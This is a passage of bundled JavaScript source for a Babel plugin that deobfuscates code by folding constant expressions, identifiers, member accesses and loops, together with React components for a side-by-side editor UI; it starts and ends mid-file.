binding.setValue(evaluated.value);\n        }\n        else {\n            binding.clearValue();\n        }\n    },\n    AssignmentExpression: function (path) {\n        var assignment = path.node;\n        if (assignment.operator !== '=' || !t.isIdentifier(assignment.left)) {\n            return;\n        }\n        var evaluated = expressions_1.evaluateExpression(path.get('right'));\n        var binding = path.scope.getBinding(assignment.left.name);\n        if (evaluated && u.hasValue(evaluated)) {\n            binding.setValue(evaluated.value);\n        }\n        else {\n            binding.clearValue();\n        }\n    }\n}); };\nfunction evaluate(path, paramBindings) {\n    paramBindings = paramBindings || {};\n    var body = path.get('body');\n    var functionScope = body.scope;\n    var result = null;\n    setParamBindings(functionScope, paramBindings);\n    if (t.isExpression(body.node)) {\n        if (u.hasValue(body.node)) {\n            result = u.someLiteral(body.node.value);\n        }\n        else {\n            result = expressions_1.evaluateExpression(body);\n        }\n    }\n    else if (t.isBlockStatement(body.node)) {\n        if (!isEvaluable(path, body.node)) {\n            return null;\n        }\n        body.traverse(bindingInferrer());\n        var resultPath = body.get('body')\n            .filter(function (p) { return p.isReturnStatement(); })[0]\n            .get('argument');\n        var resultNode = expressions_1.evaluateExpression(resultPath);\n        if (resultNode) {\n            if (u.hasValue(resultNode) || (t.isIdentifier(resultNode) && !functionScope.getOwnBinding(resultNode.name))) {\n                result = resultNode;\n            }\n        }\n    }\n    clearParamBindings(functionScope, paramBindings);\n    return result;\n}\nexports.evaluate = evaluate;\nfunction evaluatedArguments(path) {\n    if (!path.isCallExpression() && !path.isNewExpression()) {\n        throw new Error('Expected call or new expression, not ' + path.type);\n    }\n    return path.get('arguments').map(function (arg) { return expressions_1.evaluateExpression(arg); });\n}\nexports.evaluatedArguments = evaluatedArguments;\n/** Determine if the implementation can evaluate the function */\nfunction isEvaluable(path, body) {\n    t.assertBlockStatement(body);\n    var returns = body.body.filter(function (s) { return t.isReturnStatement(s); });\n    if (returns.length !== 1) {\n        return false;\n    }\n    return body.body.every(function (statement) {\n        return t.isReturnStatement(statement) ||\n            t.isVariableDeclaration(statement) ||\n            u.isAssignmentExpressionStatement(statement);\n    });\n}\nfunction setParamBindings(scope, paramBindings) {\n    Object.keys(paramBindings).forEach(function (name) {\n        var binding = scope.getBinding(name);\n        if (binding) {\n            binding.setValue(paramBindings[name]);\n        }\n    });\n}\nfunction clearParamBindings(scope, paramBindings) {\n    Object.keys(paramBindings).forEach(function (name) {\n        var binding = scope.getBinding(name);\n        if (binding) {\n            binding.clearValue();\n        }\n    });\n}\n//# sourceMappingURL=functions.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar u = require(\"./utils\");\nvar expressions_1 = require(\"./expressions\");\nvar declarations_1 = require(\"./declarations\");\nvar call_expressions_1 = require(\"./call-expressions\");\nvar loops_1 = require(\"./loops\");\nfunction Deobfuscator(babel) {\n    return {\n        VariableDeclaration: declarations_1.transformDeclaration,\n        CallExpression: function (path) {\n            call_expressions_1.inlineProcedure(path, babel.traverse);\n        },\n        Expression: {\n            enter: expressions_1.deobfuscateExpression,\n            exit: function (path) {\n                expressions_1.deobfuscateExpression(path);\n                if (path.parentPath.isVariableDeclarator() && u.hasValue(path.node)) {\n                    var binding = path.scope.getBinding(path.parent.id.name);\n                    if (binding && binding.constant) {\n                        binding.setValue(path.node.value);\n                    }\n                }\n                if (u.hasValue(path.node)) {\n                    path.skip();\n                }\n            }\n        },\n        Loop: {\n            enter: loops_1.deobfuscateLoop,\n            exit: loops_1.deobfuscateLoop\n        }\n        // DCE\n        // , Scope: {\n        //   exit (path) {\n        //     Object.keys(path.scope.bindings)\n        //       .map(key => path.scope.getBinding(key))\n        //       .forEach(binding => {\n        //         const declaration = binding.path.parentPath\n        //         if (binding.constant && binding.hasValue && !binding.referenced && !declaration.removed) {\n        //           declaration.remove()\n        //         }\n        //       })\n        //   }\n        // }\n    };\n}\nfunction default_1(babel) {\n    return {\n        name: 'deobfuscate',\n        visitor: Deobfuscator(babel)\n    };\n}\nexports.default = default_1;\n//# sourceMappingURL=illuminatejs.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar arrays = require(\"./arrays\");\nvar binaryExpressions = require(\"./binary-expressions\");\nvar identifiers = require(\"./identifiers\");\nvar callExpressions = require(\"./call-expressions\");\nvar newExpressions = require(\"./new-expressions\");\nvar memberExpressions = require(\"./member-expressions\");\nvar unaryExpressions = require(\"./unary-expressions\");\nfunction deobfuscateExpression(path) {\n    if (path.isIdentifier() || (path.isLiteral() && !path.isStringLiteral())) {\n        // Only replace identifiers that are part of a larger expression.\n        return;\n    }\n    if (path.removed) {\n        return;\n    }\n    var result = evaluateExpression(path);\n    if (Array.isArray(result)) {\n        path.replaceWithMultiple(result);\n    }\n    else {\n        path.replaceWith(result);\n    }\n}\nexports.deobfuscateExpression = deobfuscateExpression;\nfunction evaluateExpression(path) {\n    path.assertExpression();\n    var evaluate = evaluator(path);\n    return evaluate(path) || path.node;\n}\nexports.evaluateExpression = evaluateExpression;\nfunction evaluator(path) {\n    if (path.isStringLiteral()) {\n        return evaluateStringLiteral;\n    }\n    else if (path.isIdentifier()) {\n        return identifiers.evaluate;\n    }\n    else if (path.isMemberExpression()) {\n        return memberExpressions.evaluate;\n    }\n    else if (path.isCallExpression()) {\n        return callExpressions.evaluate;\n    }\n    else if (path.isNewExpression()) {\n        return newExpressions.evaluate;\n    }\n    else if (path.isBinary()) {\n        return binaryExpressions.evaluate;\n    }\n    else if (path.isConditionalExpression()) {\n        return evaluateConditionalExpression;\n    }\n    else if (path.isUnaryExpression()) {\n        return unaryExpressions.evaluate;\n    }\n    else if (path.isArrayExpression()) {\n        return arrays.evaluateArrayExpression;\n    }\n    else {\n        return function () { return null; };\n    }\n}\nvar unescaped = Symbol('unescaped');\n/** This will only unescape ASCII character escape sequences */\nfunction evaluateStringLiteral(path) {\n    if (path.node[unescaped] || !u.hasValue(path.node)) {\n        return path.node;\n    }\n    var node = t.stringLiteral(path.node.value);\n    node[unescaped] = true;\n    return node;\n}\nfunction evaluateConditionalExpression(path) {\n    path.assertConditionalExpression();\n    var test = evaluateExpression(path.get('test'));\n    if (u.hasValue(test)) {\n        var result = evaluateExpression(path.get(test.value ? 'consequent' : 'alternate'));\n        if (u.hasValue(result)) {\n            return result;\n        }\n    }\n    return path.node;\n}\n//# sourceMappingURL=expressions.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar expressions_1 = require(\"./expressions\");\nfunction evaluate(path) {\n    path.assertBinary();\n    var _a = path.node, operator = _a.operator, left = _a.left, right = _a.right;\n    if (!u.hasValue(left)) {\n        left = expressions_1.evaluateExpression(path.get('left'));\n    }\n    if (!u.hasValue(right)) {\n        right = expressions_1.evaluateExpression(path.get('right'));\n    }\n    if (t.isBinaryExpression(left) && u.hasValue(left.right) && u.hasValue(right)) {\n        if (left.operator === operator && isAssociative(operator)) {\n            var result = evaluateBinaryNodes(operator, left.right, right);\n            if (result) {\n                right = result;\n                left = left.left;\n                return t.binaryExpression(operator, left, right);\n            }\n        }\n    }\n    if (u.hasValue(left) && u.hasValue(right)) {\n        return evaluateBinaryNodes(operator, left, right) || path.node;\n    }\n    return path.node;\n}\nexports.evaluate = evaluate;\nfunction isAssociative(operator) {\n    return operator === '+';\n}\nfunction evaluateBinaryNodes(operator, leftNode, rightNode) {\n    var _a = [leftNode, rightNode], left = _a[0].value, right = _a[1].value;\n    switch (operator) {\n        // Arithmetic\n        case '+': return u.someLiteral(left + right);\n        case '-': return u.someLiteral(left - right);\n        case '*': return u.someLiteral(left * right);\n        case '/': return u.someLiteral(left / right);\n        case '%': return u.someLiteral(left % right);\n        // Bitwise Shift\n        case '<<': return u.someLiteral(left << right);\n        case '>>': return u.someLiteral(left >> right);\n        case '>>>': return u.someLiteral(left >>> right);\n        // Relational\n        case '<': return u.someLiteral(left < right);\n        case '>': return u.someLiteral(left > right);\n        case '<=': return u.someLiteral(left <= right);\n        case '>=': return u.someLiteral(left >= right);\n        // !!! case 'instanceof': return u.someLiteral(left instanceof right);\n        // !!! case 'in': return u.someLiteral(left in right);\n        // Equality\n        case '==': /* tslint:disable */ return u.someLiteral(left == right); /* tslint:enable */\n        case '!=': /* tslint:disable */ return u.someLiteral(left != right); /* tslint:enable */\n        case '===': return u.someLiteral(left === right);\n        case '!==': return u.someLiteral(left !== right);\n        // Logic\n        case '&&': return u.someLiteral(left && right);\n        case '||': return u.someLiteral(left || right);\n        // Binary Bitwise\n        case '&': return u.someLiteral(left & right);\n        case '^': return u.someLiteral(left ^ right);\n        case '|': return u.someLiteral(left | right);\n        default: return null;\n    }\n}\n//# sourceMappingURL=binary-expressions.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar expressions_1 = require(\"./expressions\");\nfunction evaluate(path) {\n    t.assertIdentifier(path.node);\n    var binding = path.scope.getBinding(path.node.name);\n    if (!binding) {\n        return null;\n    }\n    var memberAssignments = u.getMemberAssignments(binding)\n        .filter(function (a) { return a.scope === path.scope; })\n        .filter(function (a) { return a.getStatementParent().key < path.getStatementParent().key; });\n    if (binding.hasValue && memberAssignments.length === 0) {\n        return u.someLiteral(binding.value);\n    }\n    if (binding.constant && binding.path.parentKey === 'declarations' && !isSelfReferencingInDeclaration(path, binding)) {\n        var init = evaluateInit(path, binding);\n        // Handle member assigments\n        if (init && u.hasValue(init)) {\n            init = t['cloneDeep'](init); // TODO declare typescript types\n            for (var _i = 0, memberAssignments_1 = memberAssignments; _i < memberAssignments_1.length; _i++) {\n                var assignment = memberAssignments_1[_i];\n                var property = expressions_1.evaluateExpression(assignment.get('left.property'));\n                if (!(u.hasValue(property) && typeof property.value !== 'boolean')) {\n                    return null;\n                }\n                var right = expressions_1.evaluateExpression(assignment.get('right'));\n                if (!u.hasValue(right)) {\n                    return null;\n                }\n                if (t.isArrayExpression(init) && u.hasValue(init)) {\n                    init.elements[property.value] = right;\n                    init.value[property.value] = right.value;\n                }\n                else {\n                    return null;\n                }\n            }\n        }\n        return init;\n    }\n    // Single assignment after declaration\n    if (binding.constantViolations.length === 1 &&\n        t.isVariableDeclarator(binding.path.node) &&\n        path.findParent(function (p) { return p === binding.constantViolations[0].parentPath; }) &&\n        !isSelfReferencingInDeclaration(path, binding)) {\n        var init = binding.path.get('init');\n        if (!init.findParent(function (p) { return t.isLoop(p); })) {\n            return evaluateInit(path, binding);\n        }\n    }\n    // Try resolving variable within local scope\n    if (binding === path.scope.getOwnBinding(path.node.name)) {\n        if (hasAssignmentsInChildScope(binding, path.scope)) {\n            return null;\n        }\n        var statementKey_1 = path.getStatementParent().key;\n        var latestAssignment = binding.constantViolations.filter(function (a) { return a.getStatementParent().key < statementKey_1; }).pop();\n        if (latestAssignment && latestAssignment.node.operator === '=') {\n            return expressions_1.evaluateExpression(latestAssignment.get('right'));\n        }\n        else {\n            return null; // TODO evaluateInit(path, binding, evaluateExpression)\n        }\n    }\n    return null;\n}\nexports.evaluate = evaluate;\nfunction evaluateInit(path, binding) {\n    if (!t.isVariableDeclarator(binding.path.node) || isSelfReferencingInDeclaration(path, binding)) {\n        return null;\n    }\n    var init = binding.path.get('init');\n    return expressions_1.evaluateExpression(init);\n}\n/** This occurs bindings are shadowed and is required to break infinite recursion. */\nfunction isSelfReferencingInDeclaration(path, binding) {\n    return getDeclaration(path) === getDeclaration(binding.path);\n}\nfunction getDeclaration(path) {\n    var parent = path.findParent(function (path) { return t.isVariableDeclaration(path.node); });\n    return parent ? parent.node : null;\n}\nfunction hasAssignmentsInChildScope(binding, scope) {\n    binding.constantViolations.some(function (p) {\n        if (!t.isAssignmentExpression(p.node)) {\n            return true;\n        }\n        if (p.scope !== scope) {\n            if (p.scope.path.isFunctionDeclaration()) {\n                return p.scope.getBinding(p.scope.path.node.id.name).referenced;\n            }\n            return true;\n        }\n    });\n}\n//# sourceMappingURL=identifiers.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar functions_1 = require(\"./functions\");\nfunction evaluate(path) {\n    path.assertNewExpression();\n    if (!t.isIdentifier(path.node.callee)) {\n        return null;\n    }\n    var constructor = path.node.callee.name;\n    switch (constructor) {\n        case 'Array': return evaluateArrayConstructor(path);\n        default: return null;\n    }\n}\nexports.evaluate = evaluate;\nfunction evaluateArrayConstructor(path) {\n    var args = u.withValues(functions_1.evaluatedArguments(path));\n    if (!args) {\n        return null;\n    }\n    if (args.length === 1 &&\n        typeof args[0].value === 'number' &&\n        Number.isInteger(args[0].value)) {\n        // If the only argument passed to the Array constructor is an integer, this returns a new array with its length property set to that number (Note: this implies an array of arrayLength empty slots, not slots with actual undefined values).\n        return null;\n    }\n    try {\n        return u.someLiteral(new (Array.bind.apply(Array, [void 0].concat(args.map(function (a) { return a.value; }))))());\n    }\n    catch (e) {\n        console.warn('Cannot evaluate array constructor', path.getSource());\n        return null;\n    }\n}\n//# sourceMappingURL=new-expressions.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar arrays = require(\"./arrays\");\nvar expressions_1 = require(\"./expressions\");\nfunction evaluate(path) {\n    path.assertMemberExpression();\n    if (t.isAssignmentExpression(path.parent) && path.key === 'left') {\n        return null;\n    }\n    var memberExpression = path.node;\n    var propertyValue;\n    if (memberExpression.computed && t.isExpression(memberExpression.property)) {\n        var evaluated = expressions_1.evaluateExpression(path.get('property'));\n        if (u.hasValue(evaluated)) {\n            propertyValue = evaluated.value;\n            var transformedExpression = transformComputedMemberExpression(memberExpression, propertyValue, path.scope);\n            if (!t.isMemberExpression(transformedExpression)) {\n                return transformedExpression;\n            }\n            memberExpression = transformedExpression;\n        }\n        else {\n            return memberExpression;\n        }\n    }\n    else if (t.isIdentifier(memberExpression.property)) {\n        propertyValue = memberExpression.property.name;\n    }\n    else {\n        return memberExpression;\n    }\n    if (t.isIdentifier(memberExpression.object)) {\n        var binding = path.scope.getBinding(memberExpression.object.name);\n        if (!binding) {\n            return memberExpression;\n        }\n        var object = expressions_1.evaluateExpression(path.get('object'));\n        if (!object || !u.hasValue(object)) {\n            return memberExpression;\n        }\n        if (arrays.getMutatorCalls(binding).length > 0) {\n            // TODO potential for improvement here\n            return memberExpression;\n        }\n        var assignments = u.getMemberAssignments(binding, { propertyValue: propertyValue });\n        if (assignments.some(function (p) { return p.scope !== path.scope; })) {\n            // Out of scope mutation\n            return memberExpression;\n        }\n        var previousAssignments = assignments.filter(function (p) { return p.getStatementParent().key < path.getStatementParent().key; });\n        if (previousAssignments.length > 0) {\n            // Find value of most recent previous assignment\n            var lastAssignment = previousAssignments[previousAssignments.length - 1];\n            var result = expressions_1.evaluateExpression(lastAssignment.get('right'));\n            if (result && u.hasValue(result)) {\n                return u.someLiteral(result.value);\n            }\n        }\n        else {\n            return getMemberExpressionValue(path, object, propertyValue) || memberExpression;\n        }\n    }\n    else if (u.hasValue(memberExpression.object)) {\n        return getMemberExpressionValue(path, memberExpression.object, propertyValue) || memberExpression;\n    }\n    return memberExpression;\n}\nexports.evaluate = evaluate;\nfunction getMemberExpressionValue(path, object, propertyValue) {\n    var value = object.value[propertyValue];\n    return u.someLiteral(value);\n}\nfunction transformComputedMemberExpression(memberExpression, propertyValue, scope) {\n    if (u.isNumeric(propertyValue) && typeof propertyValue !== 'number') {\n        var property = t.numericLiteral(parseFloat(propertyValue));\n        return t.memberExpression(memberExpression.object, property, true);\n    }\n    else if (typeof propertyValue === 'string') {\n        if (t.isThisExpression(memberExpression.object) && isGlobalScope(scope)) {\n            return t.identifier(propertyValue);\n        }\n        return t.memberExpression(memberExpression.object, t.identifier(propertyValue), false);\n    }\n    else {\n        return memberExpression;\n    }\n}\nfunction isGlobalScope(scope) {\n    return !scope.parent;\n}\n//# sourceMappingURL=member-expressions.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar u = require(\"./utils\");\nvar expressions_1 = require(\"./expressions\");\nfunction evaluate(path) {\n    path.assertUnaryExpression();\n    var argument = path.node.argument;\n    if (!u.hasValue(argument)) {\n        argument = expressions_1.evaluateExpression(path.get('argument'));\n    }\n    if (u.hasValue(argument)) {\n        return evaluateUnaryNode(path.node.operator, argument);\n    }\n    return null;\n}\nexports.evaluate = evaluate;\nfunction evaluateUnaryNode(operator, argument) {\n    switch (operator) {\n        case '!': return u.someLiteral(!argument.value);\n        case '~': return u.someLiteral(~argument.value);\n        case '-': return u.someLiteral(-argument.value);\n        case '+': return u.someLiteral(+argument.value);\n        default: return null;\n    }\n}\n//# sourceMappingURL=unary-expressions.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar arrays = require(\"./arrays\");\nvar deobfuscated = Symbol('deobfuscated');\nfunction transformDeclaration(path) {\n    if (path.node[deobfuscated] || t.isLoop(path.parent)) {\n        return;\n    }\n    var declarations = transformVariableDeclaration(path.node, path.scope);\n    declarations.forEach(function (it) { it[deobfuscated] = true; });\n    var declarationKey = path.key;\n    declarations\n        .map(function (d) { return d.declarations[0]; })\n        .map(function (d) { return [path.scope.getBinding(d.id.name), d.init]; })\n        .forEach(function (_a) {\n        var binding = _a[0], init = _a[1];\n        if (binding) {\n            foldConsecutiveArrayPush(binding, init, declarationKey);\n            checkArrayMutatorCalls(binding);\n        }\n    });\n    if (declarations.length === 1) {\n        path.replaceWith(declarations[0]);\n    }\n    else {\n        // TODO This marks the path as `removed`, but continues traversal which can cause problems down the line...\n        path.replaceWithMultiple(declarations);\n    }\n}\nexports.transformDeclaration = transformDeclaration;\n// - Split declarators into separate declarations.\n// - Mark constants with `const` keyword.\nfunction transformVariableDeclaration(node, scope) {\n    t.assertVariableDeclaration(node);\n    return node.declarations.map(function (declarator) {\n        if (t.isIdentifier(declarator.id)) {\n            var binding = scope.getBinding(declarator.id.name);\n            if (binding && binding.constant && declarator.init) {\n                return t.variableDeclaration('const', [declarator]);\n            }\n        }\n        return t.variableDeclaration('var', [declarator]);\n    });\n}\nfunction checkArrayMutatorCalls(binding) {\n    if (!binding.hasValue || !Array.isArray(binding.value)) {\n        return;\n    }\n    var mutatorCalls = arrays.getMutatorCalls(binding);\n    if (mutatorCalls.length === 0) {\n        return;\n    }\n    if (mutatorCalls.some(function (m) { return m.node.callee.property.name !== 'push'; })) {\n        binding.deoptValue();\n    }\n}\n// Simplify a very specific case where an array declaration is followed by `push` calls.\nfunction foldConsecutiveArrayPush(binding, init, declarationKey) {\n    var _a;\n    var mutatorCalls = arrays.getMutatorCalls(binding);\n    if (mutatorCalls.length === 0) {\n        return;\n    }\n    for (var _i = 0, mutatorCalls_1 = mutatorCalls; _i < mutatorCalls_1.length; _i++) {\n        var call = mutatorCalls_1[_i];\n        var statementPath = call.getStatementParent();\n        if ((declarationKey + 1) !== statementPath.key || call.node.callee.property.name !== 'push') {\n            binding.deoptValue();\n            break;\n        }\n        (_a = init.elements).push.apply(_a, call.node.arguments);\n        statementPath.remove();\n    }\n    if (init.elements.every(function (e) { return u.hasValue(e); })) {\n        binding.setValue(init.elements.map(function (e) { return e.value; }));\n    }\n    else {\n        binding.deoptValue();\n    }\n}\n//# sourceMappingURL=declarations.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar expressions_1 = require(\"./expressions\");\nfunction deobfuscateLoop(path) {\n    path.assertLoop();\n    if (!t.isForStatement(path.node) || !isLoopBodyEvaluable(path)) {\n        return;\n    }\n    try {\n        var statements = evaluateLoop(path, path.node);\n        path.replaceWithMultiple(statements);\n    }\n    catch (e) {\n        console.warn(e.message);\n        if (!path.node.leadingComments || path.node.leadingComments.length === 0) {\n            path.addComment('leading', ' ' + e.message, true);\n        }\n    }\n}\nexports.deobfuscateLoop = deobfuscateLoop;\nfunction isLoopBodyEvaluable(path) {\n    return getBodyStatements(path).every(function (p) {\n        return t.isVariableDeclaration(p.node) ||\n            t.isExpressionStatement(p.node) && (t.isAssignmentExpression(p.node.expression) || t.isUpdateExpression(p.node.expression));\n    });\n}\nvar error = {\n    body: function (path) { return new Error('Unevaluable statement in loop: ' + path.type); },\n    init: function () { return new Error('Unevaluable loop init expression'); },\n    test: function () { return new Error('Unevaluable loop test expression'); },\n    update: function () { return new Error('Unevaluable loop update expression'); }\n};\nfunction evaluateLoop(path, loop) {\n    t.assertForStatement(loop);\n    var control = findControlVariable(path, loop);\n    if (!control) {\n        throw new Error('Unknown loop control variable');\n    }\n    var statements = getBodyStatements(path);\n    var evaluatedNodes = [];\n    evaluateLoopWithControlVariable(path, loop, control, function (controlValue) {\n        evaluatedNodes = statements\n            .map(function (path) {\n            if (t.isExpressionStatement(path.node)) {\n                var expression = path.get('expression');\n                if (t.isAssignmentExpression(expression.node)) {\n                    return evaluateAssignmentExpression(expression, expression.node);\n                }\n                else if (t.isUpdateExpression(expression.node)) {\n                    return evaluateUpdateExpression(expression, expression.node);\n                }\n                else {\n                    throw error.body(path);\n                }\n            }\n            else if (t.isVariableDeclaration(path.node)) {\n                return t.noop();\n            }\n            else {\n                throw error.body(path);\n            }\n        })\n            .map(function (result) {\n            return t.isExpression(result) ? t.expressionStatement(result) : result;\n        });\n    });\n    return evaluatedNodes;\n}\nfunction findControlVariable(path, loop) {\n    var name;\n    var init;\n    if (t.isVariableDeclaration(loop.init) && loop.init.declarations.length === 1) {\n        var declaration = loop.init.declarations[0];\n        if (t.isIdentifier(declaration.id)) {\n            name = declaration.id.name;\n            var evaluatedInit = expressions_1.evaluateExpression(path.get('init.declarations.0.init'));\n            if (t.isLiteral(evaluatedInit) && u.hasValue(evaluatedInit)) {\n                init = evaluatedInit;\n            }\n        }\n    }\n    if (name !== undefined && init !== undefined) {\n        return { name: name, init: init };\n    }\n    else {\n        return null;\n    }\n}\nfunction evaluateLoopWithControlVariable(path, loop, controlInfo, evaluateIteration) {\n    t.assertForStatement(loop);\n    function isControlIdentifier(node) {\n        return t.isIdentifier(node, { name: controlInfo.name });\n    }\n    var test;\n    test = function (control) {\n        var result = expressions_1.evaluateExpression(path.get('test'));\n        if (u.hasValue(result)) {\n            return result.value ? true : false;\n        }\n        else {\n            throw error.test();\n        }\n    };\n    var update;\n    if (t.isUpdateExpression(loop.update) && isControlIdentifier(loop.update.argument)) {\n        switch (loop.update.operator) {\n            case '++':\n                update = function (control) { return u.someLiteral(control.value + 1); };\n                break;\n            case '--':\n                update = function (control) { return u.someLiteral(control.value - 1); };\n                break;\n            default: throw error.update();\n        }\n    }\n    else if (t.isAssignmentExpression(loop.update) && isControlIdentifier(loop.update.left)) {\n        var assignment_1 = loop.update;\n        var rightPath_1 = path.get('update.right');\n        update = function (control) {\n            var evaluatedRight = expressions_1.evaluateExpression(rightPath_1);\n            if (u.hasValue(evaluatedRight)) {\n                var value = u.assignmentValue(assignment_1.operator, control.value, evaluatedRight.value);\n                return u.someLiteral(value);\n            }\n            else {\n                throw error.update();\n            }\n        };\n    }\n    if (update === undefined) {\n        return;\n    }\n    var control = controlInfo.init;\n    var binding = path.scope.getBinding(controlInfo.name);\n    binding.setValue(control.value);\n    try {\n        while (test(control)) {\n            evaluateIteration(control);\n            control = update(control);\n            binding.setValue(control.value);\n        }\n    }\n    catch (e) {\n        binding.clearValue();\n        throw e;\n    }\n}\nfunction getBodyStatements(path) {\n    if (t.isBlockStatement(path.node.body)) {\n        return path.get('body.body');\n    }\n    else if (t.isStatement(path.node.body)) {\n        return [path.get('body')];\n    }\n    else {\n        throw error.body(path);\n    }\n}\nfunction evaluateAssignmentExpression(path, assignment) {\n    if (t.isMemberExpression(assignment.left)) {\n        return evaluateMemberAssignmentExpression(path, assignment);\n    }\n    if (!t.isIdentifier(assignment.left)) {\n        throw error.body(path);\n    }\n    var evaluated = expressions_1.evaluateExpression(path.get('right'));\n    if (u.hasValue(evaluated)) {\n        var binding = path.scope.getBinding(assignment.left.name);\n        var value = updateValue(evaluated.value, binding);\n        if (binding) {\n            binding.setValue(value);\n        }\n        return t.assignmentExpression('=', assignment.left, u.someLiteral(value));\n    }\n    else {\n        throw error.body(path);\n    }\n    /**\n     * This could be done symbolically if it makes for better de-obfuscation.\n     * I.e. generate a binary expression node instead of a literal.\n     */\n    function updateValue(value, binding) {\n        if (!binding && assignment.operator !== '=') {\n            throw error.body(path);\n        }\n        if (!binding.hasValue) {\n            if (binding.constantViolations.length === 1 && path.findParent(function (p) { return p === binding.constantViolations[0].parentPath; })) {\n                var evaluated_1 = expressions_1.evaluateExpression(binding.path.get('init'));\n                if (u.hasValue(evaluated_1)) {\n                    binding.setValue(evaluated_1.value);\n                }\n            }\n        }\n        return u.assignmentValue(assignment.operator, binding.value, value);\n    }\n}\nfunction evaluateMemberAssignmentExpression(path, assignment) {\n    if (!(t.isMemberExpression(assignment.left, { computed: true }) && t.isIdentifier(assignment.left.object))) {\n        throw error.body(path);\n    }\n    var property = expressions_1.evaluateExpression(path.get('left.property'));\n    if (!(u.hasValue(property) && u.isNumeric(property.value))) {\n        throw error.body(path);\n    }\n    if (typeof property.value === 'boolean') {\n        throw error.body(path);\n    }\n    var evaluated = expressions_1.evaluateExpression(path.get('right'));\n    if (u.hasValue(evaluated)) {\n        var binding = path.scope.getBinding(assignment.left.object.name);\n        if (!binding || !binding.hasValue) {\n            throw error.body(path);\n        }\n        binding.value[property.value] = u.assignmentValue(assignment.operator, binding.value[property.value], evaluated.value);\n        return t.assignmentExpression('=', assignment.left.object, u.someLiteral(binding.value));\n    }\n    else {\n        throw error.body(path);\n    }\n}\nfunction evaluateUpdateExpression(path, update) {\n    if (!t.isIdentifier(update.argument)) {\n        throw error.body(path);\n    }\n    var evaluated = expressions_1.evaluateExpression(path.get('argument'));\n    if (u.hasValue(evaluated)) {\n        var value = u.updateValue(update.operator, evaluated.value);\n        if (t.isIdentifier(update.argument)) {\n            path.scope.getBinding(update.argument.name).setValue(value);\n        }\n        return t.assignmentExpression('=', update.argument, u.someLiteral(value));\n    }\n    else {\n        throw error.body(path);\n    }\n}\n//# sourceMappingURL=loops.js.map","// @flow\n\nimport React, { Component } from 'react'\n\nimport CodeMirror from 'codemirror'\nimport 'codemirror/mode/javascript/javascript'\n\nimport 'codemirror/lib/codemirror.css'\nimport './CodeEditor.css'\nimport 'codemirror/addon/display/placeholder.js'\n\ntype Props = {\n  code: string,\n  onCodeChange?: string => void,\n  style?: Object,\n  placeholder?: string,\n  readOnly?: boolean\n}\n\nclass CodeEditor extends Component {\n  props: Props\n  editor: CodeMirror\n  textarea: HTMLTextAreaElement\n\n  componentDidMount () {\n    this.editor = CodeMirror.fromTextArea(this.textarea, {\n      mode: 'text/javascript',\n      lineNumbers: true,\n      viewportMargin: Infinity,\n      readOnly: this.props.readonly || false\n    })\n    this.editor.on('change', this.onCodeMirrorChange.bind(this))\n  }\n\n  onCodeMirrorChange (codeMirror: CodeMirror, change: { origin: bool }) {\n    if (change.origin === 'setValue') {\n      return\n    }\n\n    const code = codeMirror.getValue()\n\n    if (this.props.onCodeChange) {\n      this.props.onCodeChange(code)\n    }\n  }\n\n  shouldComponentUpdate (nextProps: Props) {\n    const value = nextProps.code || ''\n    if (this.editor) {\n      if (this.editor.getValue() !== value) {\n        this.editor.setValue(value)\n      }\n      return false\n    } else {\n      return true\n    }\n  }\n\n  render () {\n    const value = this.props.code || ''\n    const placeholder = this.props.placeholder || ''\n    return (\n      <div className='code-editor' style={this.props.style}>\n        <textarea placeholder={placeholder} defaultValue={value} ref={textarea => { this.textarea = textarea }} />\n      </div>\n    )\n  }\n}\n\nexport default CodeEditor\n","// @flow\n\nimport React, { Component } from 'react'\nimport CodeEditor from './CodeEditor'\n\nimport * as prettier from 'prettier-standalone' // Very large\nimport * as Babel from 'babel-standalone'\n// $FlowFixMe\nimport deobfuscatePlugin from '../../babel-plugin-deobfuscate/'\nimport debounce from 'lodash.debounce'\n\ntype Props = {\n  code: string,\n  onCodeChange?: string => void\n}\n\ntype State = {\n  input: string,\n  output: string\n}\n\nclass Deobfuscator extends Component {\n  props: Props\n  state: State\n  updateOutput: (input: string) => void\n\n  constructor (props: Object) {\n    super(props)\n    this.updateOutput = debounce(code => {\n      this.setState({ output: _deobfuscate(code) })\n    }, 500)\n    this.state = {\n      input: props.code,\n      output: _deobfuscate(props.code)\n    }\n  }\n\n  render () {\n    return (\n      <div style={{display: 'flex', flexWrap: 'wrap', height: '100%'}}>\n        <div className='horizontal-spacing' style={{flexBasis: '100%', marginTop: '15px', marginBottom: '5px', marginLeft: '15px'}}>\n          <button onClick={this.format.bind(this)}>Format</button>\n          <button disabled>De-Obfuscate</button> <small><i>Deobfuscation will happen on the fly, as you paste/type</i></small>\n        </div>\n        <CodeEditor placeholder=\"Enter your obfuscated code here...\" style={{width: '50%'}} code={this.state.input} onCodeChange={this.onInputEditorChange.bind(this)} />\n        <CodeEditor placeholder=\"The deobfuscated code will appear here\" style={{width: '50%'}} code={this.state.output} />\n      </div>\n    )\n  }\n\n  componentWillReceiveProps (nextProps: Props) {\n    const input = nextProps.code\n    this.setState({ input }, () => {\n      this.updateOutput(input)\n    })\n  }\n\n  onInputEditorChange (input: string) {\n    this.setState({ input }, () => {\n      this.updateOutput(input)\n      this.props.onCodeChange && this.props.onCodeChange(input)\n    })\n  }\n\n  format () {\n    if(this.state.input !== undefined && this.state.input !== \"\"){\n      const input = prettier.format(this.state.input)\n      this.props.onCodeChange && this.props.onCodeChange(input)\n      this.setState({ 